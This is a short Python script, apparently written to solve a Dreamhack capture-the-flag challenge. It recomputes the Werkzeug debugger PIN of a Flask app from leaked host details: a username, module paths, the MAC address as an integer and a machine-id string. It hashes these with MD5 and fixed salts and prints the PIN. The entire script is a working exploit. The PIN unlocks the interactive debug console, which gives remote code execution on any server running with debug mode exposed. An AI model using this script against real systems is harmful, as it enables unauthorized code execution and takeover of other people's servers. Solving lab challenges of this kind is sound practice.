import hashlib
from itertools import chain

probably_public_bits = [
    'dreamhack',
    'flask.app',
    'Flask', 
    '/usr/local/lib/python3.8/site-packages/flask/app.py'
]

private_bits = [
    '187999308508673',  # MAC address as integer
    'c31eea55a29431535ff01de94bdcf5cflibpod-4ddad2429e183c504b8f9c69963dc54ba81fe1cf4f10220a408ca3c4701c6b5c'
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

h.update(b"pinsalt")
num = ("%09d" % int(h.hexdigest(), 16))[:9]

pin = f"{num[:3]}-{num[3:6]}-{num[6:9]}"
print(f"PIN: {pin}")